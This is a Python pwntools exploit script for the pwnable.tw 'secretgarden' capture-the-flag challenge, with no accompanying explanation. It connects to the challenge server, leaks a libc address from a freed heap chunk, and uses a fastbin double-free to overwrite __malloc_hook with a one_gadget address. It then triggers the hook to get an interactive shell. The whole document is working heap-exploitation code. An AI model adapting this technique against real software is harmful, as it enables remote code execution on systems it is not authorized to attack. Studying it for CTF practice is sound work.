from pwn import *
debug = 0
if debug:
	s = process("./secretgarden")
	raw_input('debug')
	free_hook_offset = 0x3c67a8
	malloc_hook_offset = 0x3c4b10
	system_offset = 0x453a0
	gadget = [0x45226,0x4527a,0xf0364,0xf1207] # rax = null , rsp+30 null, rsp+50 null, rsp+70 null
	main_arena_offset = 0x3c4b20
else:
	s = remote('chall.pwnable.tw', 10203)
	libc = ELF('./libc_64.so.6')
	malloc_hook_offset = libc.symbols['__malloc_hook']
	free_hook_offset = libc.symbols['__free_hook']
	system_offset = libc.symbols['system']
	gadget = [0x45216,0x4526a,0xef6c4,0xf0567] # rax = null , rsp+30 null, rsp+50 null, rsp+70null
	main_arena_offset = 0x3c3b20
	
# ------------- function address ----------------
#context(log_level='debug')
raiseGarden = 0x555555554C32
removeFlow = 0x555555554DD0
main = 0x555555555048

#---------------- libc leak offset -----------------
log.info("malloc_hook_offset: 0x%x"%malloc_hook_offset)
log.info("free_hook_offset: 0x%x"%free_hook_offset)
log.info("system_offset: 0x%x"%system_offset)

# ---------------------- build function ------------------------
def malloc(size,name,color):
	log.info('malloc 0x%x'%size)
	s.sendafter('Your choice : ','1')
	s.sendlineafter('Length of the name :',str(size))
	s.sendlineafter('The name of flower :',name)
	s.sendlineafter('The color of the flower :',color)
	
def show():
	log.info('show')
	s.sendafter('choice : ','2')



def free(index):
	log.info('free %d'%index)
	s.sendafter("choice : ",'3')
	s.sendlineafter('Which flower do you want to remove from the garden:',str(index))

def clean():
	log.info('clean')
	s.sendafter("choice : ",'4')

# -------------------- exploit --------------------
# --------------------- try to leak av->top ------------------
malloc(0x90,'1'*0x28,'c'*23) #0
malloc(0x90,'2'*0x28,'d'*23) #1
free(0)
clean()
malloc(0x90,'3'*7,'e') #2
show()
s.recvuntil("3333333\n")
av_top = u64(s.recv(6)+'\x00\x00')
log.info("av_top: 0x%x"%av_top)

# -------------- calc address base + libc ---------------

libc_base = av_top-main_arena_offset-88
log.info("libc_base: 0x%x" % libc_base)

malloc_hook = libc_base + malloc_hook_offset
log.info("malloc_hook: 0x%x" % malloc_hook)

free_hook = libc_base + free_hook_offset
log.info("free_hook: 0x%x" % free_hook)

system = libc_base + system_offset
log.info("system: 0x%x"%system)

#-------------- try to write one_gadget to malloc_hook --------------------
malloc(0x60,'a','a') #3
malloc(0x60,'b','b') #4
free(2)
free(3)
free(2)

malloc(0x60,p64(malloc_hook-35),'A')

malloc(0x60,'A','A')
malloc(0x60,'A','A')
one_syscall = libc_base+gadget[2]
log.info("one_gadget: 0x%x"%one_syscall)
malloc(0x60,'a'*19+p64(one_syscall),'a')

free(2)
free(2)

s.interactive()
